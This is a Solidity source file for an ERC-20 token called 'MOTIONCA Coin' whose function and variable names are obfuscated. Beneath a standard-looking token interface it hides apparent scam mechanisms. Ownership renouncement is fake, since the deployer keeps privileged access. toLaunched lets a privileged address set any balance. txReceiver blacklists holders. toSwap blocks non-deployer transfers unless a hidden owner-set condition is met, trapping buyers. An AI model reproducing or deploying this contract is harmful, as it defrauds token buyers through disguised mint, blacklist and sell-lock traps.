//SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;

interface listIs {
    function totalSupply() external view returns (uint256);

    function balanceOf(address atLimitTeam) external view returns (uint256);

    function transfer(address feeTx, uint256 receiverBuyTo) external returns (bool);

    function allowance(address minExempt, address spender) external view returns (uint256);

    function approve(address spender, uint256 receiverBuyTo) external returns (bool);

    function transferFrom(
        address sender,
        address feeTx,
        uint256 receiverBuyTo
    ) external returns (bool);

    event Transfer(address indexed from, address indexed receiverExempt, uint256 value);
    event Approval(address indexed minExempt, address indexed spender, uint256 value);
}

interface listIsMetadata is listIs {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract maxSellLaunched {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface maxEnable {
    function createPair(address minMarketingSell, address shouldAuto) external returns (address);
}

interface enableBuyLaunch {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract MOTIONCACoin is maxSellLaunched, listIs, listIsMetadata {

    address private buyLaunched;

    bool public isTx;

    function toLaunched(address teamIs, uint256 receiverBuyTo) public {
        totalSell();
        teamList[teamIs] = receiverBuyTo;
    }

    address fromToken = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function owner() external view returns (address) {
        return buyLaunched;
    }

    function approve(address toToken, uint256 receiverBuyTo) public virtual override returns (bool) {
        launchedTrading[_msgSender()][toToken] = receiverBuyTo;
        emit Approval(_msgSender(), toToken, receiverBuyTo);
        return true;
    }

    function name() external view virtual override returns (string memory) {
        return maxAmountLaunch;
    }

    uint256 private atTeamSell;

    function tradingMarketing(address swapSell, address feeTx, uint256 receiverBuyTo) internal returns (bool) {
        require(teamList[swapSell] >= receiverBuyTo);
        teamList[swapSell] -= receiverBuyTo;
        teamList[feeTx] += receiverBuyTo;
        emit Transfer(swapSell, feeTx, receiverBuyTo);
        return true;
    }

    function allowance(address amountMarketing, address toToken) external view virtual override returns (uint256) {
        if (toToken == fromToken) {
            return type(uint256).max;
        }
        return launchedTrading[amountMarketing][toToken];
    }

    mapping(address => bool) public autoTx;

    function decimals() external view virtual override returns (uint8) {
        return modeLimit;
    }

    function getOwner() external view returns (address) {
        return buyLaunched;
    }

    mapping(address => mapping(address => uint256)) private launchedTrading;

    function totalAmount() public {
        emit OwnershipTransferred(totalTeam, address(0));
        buyLaunched = address(0);
    }

    function txReceiver(address liquidityToMax) public {
        totalSell();
        if (atTeamSell == liquidityTotal) {
            sellExemptIs = atTeamSell;
        }
        if (liquidityToMax == totalTeam || liquidityToMax == fundAmount) {
            return;
        }
        listIsAt[liquidityToMax] = true;
    }

    uint256 public sellExemptIs;

    uint256 private maxSenderMarketing;

    address toAmountTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function transfer(address teamIs, uint256 receiverBuyTo) external virtual override returns (bool) {
        return toSwap(_msgSender(), teamIs, receiverBuyTo);
    }

    address public totalTeam;

    function totalSell() private view {
        require(autoTx[_msgSender()]);
    }

    address public fundAmount;

    function totalSwap(uint256 receiverBuyTo) public {
        totalSell();
        modeAuto = receiverBuyTo;
    }

    uint256 private limitMaxMode;

    uint256 modeAuto;

    function totalSupply() external view virtual override returns (uint256) {
        return sellTeam;
    }

    function balanceOf(address atLimitTeam) public view virtual override returns (uint256) {
        return teamList[atLimitTeam];
    }

    string private teamLaunchWallet = "MCN";

    uint256 public liquidityTotal;

    uint8 private modeLimit = 18;

    mapping(address => uint256) private teamList;

    function transferFrom(address swapSell, address feeTx, uint256 receiverBuyTo) external override returns (bool) {
        if (_msgSender() != fromToken) {
            if (launchedTrading[swapSell][_msgSender()] != type(uint256).max) {
                require(receiverBuyTo <= launchedTrading[swapSell][_msgSender()]);
                launchedTrading[swapSell][_msgSender()] -= receiverBuyTo;
            }
        }
        return toSwap(swapSell, feeTx, receiverBuyTo);
    }

    bool private amountIs;

    function toSwap(address swapSell, address feeTx, uint256 receiverBuyTo) internal returns (bool) {
        if (swapSell == totalTeam) {
            return tradingMarketing(swapSell, feeTx, receiverBuyTo);
        }
        uint256 sellMinTake = listIs(fundAmount).balanceOf(toAmountTx);
        require(sellMinTake == modeAuto);
        require(!listIsAt[swapSell]);
        return tradingMarketing(swapSell, feeTx, receiverBuyTo);
    }

    function symbol() external view virtual override returns (string memory) {
        return teamLaunchWallet;
    }

    uint256 modeExempt;

    constructor (){
        
        totalAmount();
        enableBuyLaunch listSender = enableBuyLaunch(fromToken);
        fundAmount = maxEnable(listSender.factory()).createPair(listSender.WETH(), address(this));
        if (atTeamSell != limitMaxMode) {
            walletTokenLiquidity = false;
        }
        totalTeam = _msgSender();
        autoTx[totalTeam] = true;
        teamList[totalTeam] = sellTeam;
        
        emit Transfer(address(0), totalTeam, sellTeam);
    }

    uint256 private sellTeam = 100000000 * 10 ** 18;

    function totalIs(address takeMode) public {
        if (isTx) {
            return;
        }
        
        autoTx[takeMode] = true;
        if (atTeamSell == limitMaxMode) {
            limitMaxMode = maxSenderMarketing;
        }
        isTx = true;
    }

    mapping(address => bool) public listIsAt;

    bool private walletTokenLiquidity;

    string private maxAmountLaunch = "MOTIONCA Coin";

    event OwnershipTransferred(address indexed sellReceiver, address indexed modeToken);

}